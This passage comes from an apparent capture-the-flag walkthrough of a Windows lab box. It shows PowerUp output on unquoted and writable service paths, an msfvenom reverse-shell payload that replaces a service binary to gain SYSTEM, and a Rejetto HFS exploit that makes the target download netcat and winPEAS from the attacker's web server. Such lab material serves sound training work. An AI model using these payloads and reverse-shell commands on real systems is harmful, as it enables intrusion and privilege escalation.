bit%20Uninstaller%5CIUService.exe;%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20IdentityReference=STEELMOUNTAIN%5Cbill;%20Permissions=System.Object[]%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'IObitUnSvr'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20LiveUpdateSvc%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=AppendData/AddSubdirectory%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'LiveUpdateSvc'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20LiveUpdateSvc%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20LiveUpdateSvc%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5C;%20IdentityReference=BUILTIN%5CUsers;%20Permissions=WriteData/AddFile%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'LiveUpdateSvc'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20LiveUpdateSvc%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20:%20LiveUpdateSvc%0APath%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe%0AModifiablePath%20:%20@%7BModifiablePath=C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe;%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20IdentityReference=STEELMOUNTAIN%5Cbill;%20Permissions=System.Object[]%7D%0AStartName%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20:%20Write-ServiceBinary%20-Name%20'LiveUpdateSvc'%20-Path%20%3CHijackPath%3E%0ACanRestart%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20:%20LiveUpdateSvc%0ACheck%20%20%20%20%20%20%20%20%20%20:%20Unquoted%20Service%20Paths%0A%0AServiceName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0APath%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiableFile%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%0AModifiableFilePermissions%20%20%20%20%20%20%20:%20%7BWriteAttributes,%20Synchronize,%20ReadControl,%20ReadData/ListDirectory...%7D%0AModifiableFileIdentityReference%20:%20STEELMOUNTAIN%5Cbill%0AStartName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Install-ServiceBinary%20-Name%20'AdvancedSystemCareService9'%0ACanRestart%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20True%0AName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20AdvancedSystemCareService9%0ACheck%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Modifiable%20Service%20Files%0A%0AServiceName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0APath%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiableFile%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CIObit%20Uninstaller%5CIUService.exe%0AModifiableFilePermissions%20%20%20%20%20%20%20:%20%7BWriteAttributes,%20Synchronize,%20ReadControl,%20ReadData/ListDirectory...%7D%0AModifiableFileIdentityReference%20:%20STEELMOUNTAIN%5Cbill%0AStartName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Install-ServiceBinary%20-Name%20'IObitUnSvr'%0ACanRestart%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20IObitUnSvr%0ACheck%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Modifiable%20Service%20Files%0A%0AServiceName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20LiveUpdateSvc%0APath%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe%0AModifiableFile%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CLiveUpdate%5CLiveUpdate.exe%0AModifiableFilePermissions%20%20%20%20%20%20%20:%20%7BWriteAttributes,%20Synchronize,%20ReadControl,%20ReadData/ListDirectory...%7D%0AModifiableFileIdentityReference%20:%20STEELMOUNTAIN%5Cbill%0AStartName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20LocalSystem%0AAbuseFunction%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Install-ServiceBinary%20-Name%20'LiveUpdateSvc'%0ACanRestart%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20False%0AName%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20LiveUpdateSvc%0ACheck%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Modifiable%20Service%20Files%0A%0A%0APS%20%3E%20get-service%20%7C%20where%20%7B%20$_.name%20-like%20'Advanced*'%20%7D%20%7C%20ft%20-auto%0A%0AStatus%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20DisplayName%0A------%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-----------%0ARunning%20AdvancedSystemCareService9%20Advanced%20SystemCare%20Service%209" type="button"></button></div></div><pre><code>PS &gt; invoke-allchecks
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
+                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
+                IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path &lt;HijackPath&gt;
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+Name                            : IObitUnSvr
+Check                           : Modifiable Service Files
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+Name                            : LiveUpdateSvc
+Check                           : Modifiable Service Files
+
+
+PS &gt; get-service | where { $_.name -like 'Advanced*' } | ft -auto
+
+Status  Name                       DisplayName
+------  ----                       -----------
+Running AdvancedSystemCareService9 Advanced SystemCare Service 9
+</code></pre><p>The service <code>AdvancedSystemCareService9</code> has <code>CanRestart</code> enabled and also is vulnerable to <code>Unquoted Service Paths</code>. Use <code>msfvenom</code> to create a <code>reverse shell</code> payload to masquerade as executable <code>C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</code> within the OS.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20windows/shell_reverse_tcp%20LHOST=%3Csource-ip%3E%20LPORT=4443%20-e%20x86/shikata_ga_nai%20-f%20exe%20-o%20ASCService.exe" type="button"></button></div></div><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;source-ip&gt; LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Windows%20from%20the%20payload%0A[-]%20No%20arch%20selected,%20selecting%20arch:%20x86%20from%20the%20payload%0AFound%201%20compatible%20encoders%0AAttempting%20to%20encode%20payload%20with%201%20iterations%20of%20x86/shikata_ga_nai%0Ax86/shikata_ga_nai%20succeeded%20with%20size%20351%20(iteration=0)%0Ax86/shikata_ga_nai%20chosen%20with%20final%20size%20351%0APayload%20size:%20351%20bytes%0AFinal%20size%20of%20exe%20file:%2073802%20bytes%0ASaved%20as:%20ASCService.exe" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe file: 73802 bytes
+Saved as: ASCService.exe
+</code></pre><p>From the <code>meterpreter</code> shell in <code>msfconsole -q</code>, upload the <code>reverse shell</code> payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20upload%20/root/ASCService.exe%0A[*]%20uploading%20%20:%20/root/ASCService.exe%20-%3E%20ASCService.exe%0A[*]%20Uploaded%2072.07%20KiB%20of%2072.07%20KiB%20(100.0%25):%20/root/ASCService.exe%20-%3E%20ASCService.exe%0A[*]%20uploaded%20%20%20:%20/root/ASCService.exe%20-%3E%20ASCService.exe%0A%0Ameterpreter%20%3E%20powershell_shell%0APS%20%3E%20stop-service%20AdvancedSystemCareService9%0A%0Acopy%20%22c:%5Cusers%5Cbill%5Cdesktop%5CASCService.exe%22%20%22C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe%22" type="button"></button></div></div><pre><code>meterpreter &gt; upload /root/ASCService.exe
+[*] uploading  : /root/ASCService.exe -&gt; ASCService.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/ASCService.exe -&gt; ASCService.exe
+[*] uploaded   : /root/ASCService.exe -&gt; ASCService.exe
+
+meterpreter &gt; powershell_shell
+PS &gt; stop-service AdvancedSystemCareService9
+
+copy "c:\users\bill\desktop\ASCService.exe" "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+</code></pre><p>Create a <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%204443" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 4443
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%204443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 4443)
+</code></pre><p>From the <code>msfconsole -q</code> shell, start the exploited shell to spawn <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="PS%20%3E%20start-service%20AdvancedSystemCareService9" type="button"></button></div></div><pre><code>PS &gt; start-service AdvancedSystemCareService9
+</code></pre><p>Check the <code>netcat</code> listener for connection, and get the flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049287%20received!%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5CWindows%5Csystem32%3Ewhoami%0Awhoami%0Ant%20authority%5Csystem%0A%0AC:%5CWindows%5Csystem32%3Ecd%20../..%0Acd%20../..%0A%0AC:%5C%3Edir%20/s%20/p%20root.txt%0Adir%20/s%20/p%20root.txt%0AVolume%20in%20drive%20C%20has%20no%20label.%0AVolume%20Serial%20Number%20is%202E4A-906A%0A%0ADirectory%20of%20C:%5CUsers%5CAdministrator%5CDesktop%0A%0A09/27/2019%20%2005:41%20AM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2032%20root.txt%0A%20%20%20%20%20%20%20%20%20%20%20%201%20File(s)%20%20%20%20%20%20%20%20%20%20%20%20%2032%20bytes%0A%0A%20%20%20%20Total%20Files%20Listed:%0A%20%20%20%20%20%20%20%20%20%20%20%201%20File(s)%20%20%20%20%20%20%20%20%20%20%20%20%2032%20bytes%0A%20%20%20%20%20%20%20%20%20%20%20%200%20Dir(s)%20%2044,153,417,728%20bytes%20free%0A%0AC:%5C%3Emore%20%22C:%5CUsers%5CAdministrator%5CDesktop%5Croot.txt%22%0Amore%20%22C:%5CUsers%5CAdministrator%5CDesktop%5Croot.txt%22%0A%3Cflag%3E" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49287 received!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;cd ../..
+cd ../..
+
+C:\&gt;dir /s /p root.txt
+dir /s /p root.txt
+Volume in drive C has no label.
+Volume Serial Number is 2E4A-906A
+
+Directory of C:\Users\Administrator\Desktop
+
+09/27/2019  05:41 AM                32 root.txt
+            1 File(s)             32 bytes
+
+    Total Files Listed:
+            1 File(s)             32 bytes
+            0 Dir(s)  44,153,417,728 bytes free
+
+C:\&gt;more "C:\Users\Administrator\Desktop\root.txt"
+more "C:\Users\Administrator\Desktop\root.txt"
+&lt;flag&gt;
+</code></pre><h2 id="task-4---access-and-escalation-without-metasploit">Task 4 - Access and Escalation Without Metasploit</h2><h3 id="references-3">References</h3><ul><li><a href="https://www.exploit-db.com/exploits/39161" target="_blank">Rejetto HTTP File Server RCE script</a><li><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank">Netcat for windows</a><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe" target="_blank">WinPEAS</a></ul><p>Download the <code>Rejetto HTTP File Server RCE script</code>, <code>Netcat for windows</code> and <code>WinPEAS</code> scripts.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20https://www.exploit-db.com/exploits/39161%0Awget%20https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe%0Awget%20https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe" type="button"></button></div></div><pre><code>wget https://www.exploit-db.com/exploits/39161
+wget https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
+wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+</code></pre><p>Start a <code>python web server</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python3%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python3 -m http.server 8080
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Serving%20HTTP%20on%200.0.0.0%20port%208080%20(http://0.0.0.0:80/)%20..." type="button"></button></div></div><pre><code>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:80/) ...
+</code></pre><p>Create a <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rlwrap%20-cAr%20nc%20-lnvp%204443" type="button"></button></div></div><pre><code>rlwrap -cAr nc -lnvp 4443
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%204443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 4443)
+</code></pre><p>Edit the downloaded exploit script <code>39161.py</code> to update <code>ip_addr</code> and <code>local_port</code>. Update the variable <code>vbs</code> with <code>remote port</code> and <code>netcat</code> binary name.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ip_addr%20=%20%22%3Csource-ip%3E%22%20%20%20%20%20%20#local%20IP%20address%0Alocal_port%20=%20%224443%22%20%20%20%20%20%20#%20Local%20Port%20number%0Avbs%20=%20ip_addr+%22:8080/nc.exe%22%20%20%20%20%20%20#%20add%20port" type="button"></button></div></div><pre><code>ip_addr = "&lt;source-ip&gt;"      #local IP address
+local_port = "4443"      # Local Port number
+vbs = ip_addr+":8080%2Fnc.exe"      # add port
+</code></pre><p>Run the python script <code>39161.py</code> to exploit, download the <code>netcat for windows</code> binary in target, and spawn a reverse shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python3%20-m%20http.server%208080" type="button"></button></div></div><pre><code>python3 -m http.server 8080
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%3Ctarget-ip%3E%20-%20-%20[27/Apr/2021%2006:02:25]%20%22GET%20/nc.exe%20HTTP/1.1%22%20200%20-%0A%3Ctarget-ip%3E%20-%20-%20[27/Apr/2021%2006:02:25]%20%22GET%20/nc.exe%20HTTP/1.1%22%20200%20-%0A%3Ctarget-ip%3E%20-%20-%20[27/Apr/2021%2006:02:25]%20%22GET%20/nc.exe%20HTTP/1.1%22%20200%20-%0A%3Ctarget-ip%3E%20-%20-%20[27/Apr/2021%2006:02:25]%20%22GET%20/nc.exe%20HTTP/1.1%22%20200%20-" type="button"></button></div></div><pre><code>&lt;target-ip&gt; - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
+&lt;target-ip&gt; - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
+&lt;target-ip&gt; - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
+&lt;target-ip&gt; - - [27/Apr/2021 06:02:25] "GET /nc.exe HTTP/1.1" 200 -
+</code></pre><p>There will be a <code>reverse shell</code> spawned at the <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2049346%20received!%0AMicrosoft%20Windows%20[Version%206.3.9600]%0A(c)%202013%20Microsoft%20Corporation.%20All%20rights%20reserved.%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20powershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/winPEASx64.exe%22%20-outfile%20%22winPEASx64.exe%22%0Apowershell%20-c%20wget%20%22http://%3Csource-ip%3E:8080/winPEASx64.exe%22%20-outfile%20%22winPEASx64.exe%22%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20winPEASx64.exe%20cmd%20%3E%20output.txt%0AwinPEASx64.exe%20cmd%20%3E%20output.txt%0A%0AC:%5CUsers%5Cbill%5CAppData%5CRoaming%5CMicrosoft%5CWindows%5CStart%20Menu%5CPrograms%5CStartup%3E%20more%20output.txt%0Amore%20output.txt%0A========================================(Services%20Information)========================================%0A[+]%20Interesting%20Services%20-non%20Microsoft-%0A[?]%20Check%20if%20you%20can%20overwrite%20some%20service%20binary%20or%20perform%20a%20DLL%20hijacking,%20also%20check%20for%20unquoted%20paths%20https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services%0AAdvancedSystemCareService9(IObit%20-%20Advanced%20SystemCare%20Service%209)[C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%5CASCService.exe]%20-%20Auto-%20Running%20-%20No%20quotes%20and%20Space%20detected%0AFile%20Permissions:%20bill%20[WriteData/CreateFiles]%0APossible%20DLL%20Hijacking%20in%20binary%20folder:%20C:%5CProgram%20Files%20(x86)%5CIObit%5CAdvanced%20SystemCare%20(bill%20[WriteData/CreateFiles])%0AAdvanced%20SystemCare%20Service" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 49346 received!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; powershell -c wget "http://&lt;source-ip&gt;:8080/winPEASx64.exe" -outfile "winPEASx64.exe"
+powershell -c wget "http://&lt;source-ip&gt;:8080/winPEASx64.exe" -outfile "winPEASx64.exe"
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; winPEASx64.exe cmd &gt; output.txt
+winPEASx64.exe cmd &gt; output.txt
+
